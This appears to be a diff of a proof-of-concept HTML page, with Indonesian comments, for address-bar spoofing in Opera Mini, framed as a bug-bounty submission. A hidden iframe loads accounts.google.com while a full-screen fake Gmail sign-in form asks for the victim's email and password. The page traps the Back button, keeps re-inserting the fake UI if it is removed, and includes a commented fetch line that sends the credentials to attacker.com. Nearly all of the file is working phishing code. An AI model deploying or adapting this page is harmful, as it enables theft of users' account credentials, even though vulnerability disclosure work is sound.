@@ -1,26 +1,151 @@
 <!DOCTYPE html>
-<html>
-<head><title>Loading...</title></head>
-<body style="margin:0; padding:0;">
-    <!-- 1. Iframe di belakang untuk memancing Address Bar -->
-    <iframe src="https://accounts.google.com" style="width:100vw; height:100vh; border:none; position:absolute; top:0; left:0; z-index:1;"></iframe>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        /* Reset CSS agar memenuhi layar */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', Arial, sans-serif; }
+        body, html { height: 100%; overflow: hidden; background: #fff; }
+        
+        /* Iframe tersembunyi yang akan memancing Address Bar */
+        #trigger-frame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 10px;
+            height: 10px;
+            opacity: 0.01; /* Hampir tidak terlihat */
+            z-index: -1;
+            pointer-events: none;
+        }
 
-    <!-- 2. UI Palsu di atasnya (Bisa diklik) -->
-    <div style="position:absolute; top:0; left:0; width:100vw; height:100vh; background:#fff; z-index:2;">
-        <div style="text-align:center; padding-top:40px;">
-            <h2>Sign in</h2>
-            <p>to continue to Gmail</p>
-            <!-- Form Interaktif -->
-            <input type="text" id="email" placeholder="Email" style="padding:10px; margin-bottom:10px; width:80%;">
-            <input type="password" id="pass" placeholder="Password" style="padding:10px; margin-bottom:10px; width:80%;">
-            <button onclick="alert('Credential Leaked: ' + document.getElementById('email').value + ' & ' + document.getElementById('pass').value)" style="padding:10px 20px; background:#1a73e8; color:#fff; border:none;">Next</button>
+        /* UI Palsu yang menutupi seluruh layar */
+        #spoof-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #fff;
+            z-index: 999999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 50px;
+        }
+
+        .logo { width: 80px; margin-bottom: 20px; }
+        .title { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        .subtitle { font-size: 15px; color: #202124; margin-bottom: 30px; }
+        
+        .input-group { width: 100%; max-width: 350px; padding: 0 20px; }
+        .input-box {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+        .input-box:focus { border: 2px solid #1a73e8; padding: 14px; }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            max-width: 350px;
+            padding: 0 20px;
+            margin-top: 10px;
+        }
+
+        .btn-next {
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .btn-next:active { background-color: #1557b0; }
+    </style>
+</head>
+<body>
+
+    <!-- 1. IFRAME PEMANCING (Memancing Opera Mini untuk mengubah URL Address Bar) -->
+    <!-- Kita arahkan ke URL otentikasi Google yang valid -->
+    <iframe id="trigger-frame" src="https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com" sandbox="allow-scripts allow-same-origin"></iframe>
+
+    <!-- 2. UI PALSU (Yang dilihat dan diinteraksi oleh korban) -->
+    <div id="spoof-container">
+        <!-- Gambar logo Google/Gmail (bisa diganti dengan base64 agar tidak butuh request luar) -->
+        <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" class="logo" alt="Gmail">
+        
+        <div class="title">Sign in</div>
+        <div class="subtitle">to continue to Gmail</div>
+
+        <div class="input-group">
+            <input type="text" id="victimEmail" class="input-box" placeholder="Email or phone" autocomplete="off">
+            <input type="password" id="victimPass" class="input-box" placeholder="Password" autocomplete="off">
+        </div>
+
+        <div class="button-group">
+            <a href="#" style="color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500;">Forgot password?</a>
+            <button class="btn-next" onclick="captureCredentials()">Next</button>
         </div>
     </div>
 
     <script>
-        // 3. Kunci History agar tidak bisa di-back
+        // --- LOGIKA EKSPLOITASI ---
+
+        // 1. History Trap: Mencegah korban menekan tombol 'Back' atau 'Kembali'
         history.pushState(null, null, location.href);
-        window.onpopstate = function () { history.go(1); };
+        window.addEventListener('popstate', function () {
+            history.pushState(null, null, location.href);
+        });
+
+        // 2. Mencegah dialog refresh (Opsional, membuat korban terjebak lebih lama)
+        window.onbeforeunload = function() {
+            return "Data yang belum disimpan akan hilang.";
+        };
+
+        // 3. Fungsi Pencurian Kredensial
+        function captureCredentials() {
+            const email = document.getElementById('victimEmail').value;
+            const pass = document.getElementById('victimPass').value;
+
+            if (!email || !pass) {
+                alert("Masukkan email dan password Anda.");
+                return;
+            }
+
+            // --- SIMULASI PENGIRIMAN DATA KE ATTACKER ---
+            // Di dunia nyata, data ini dikirim ke server via fetch/XHR
+            // fetch('https://attacker.com/log?email=' + email + '&pass=' + pass);
+            
+            // Untuk keperluan BUG BOUNTY, kita tampilkan alert sebagai bukti eksekusi
+            alert("🔥 POC BERHASIL! 🔥\n\nAddress Bar menunjukkan: accounts.google.com\nTapi data ditangkap oleh Origin Attacker:\n\nEmail: " + email + "\nPassword: " + pass);
+            
+            // Setelah diambil, kita pura-pura error atau redirect ke Google asli
+            // window.location.href = "https://accounts.google.com";
+        }
+
+        // 4. Trik Memaksa UI Tetap Hidup Saat Address Bar Berubah
+        // Opera Mini kadang nge-freeze halaman saat iframe selesai loading.
+        // Kita gunakan interval untuk memastikan UI kita selalu di atas.
+        setInterval(function() {
+            const container = document.getElementById('spoof-container');
+            if (container.style.display === 'none' || !container.parentNode) {
+                // Jika Opera Mini mencoba menghapus UI kita, kita paksa muncul lagi
+                document.body.appendChild(container);
+                container.style.display = 'flex';
+            }
+        }, 100);
     </script>
 </body>
 </html>
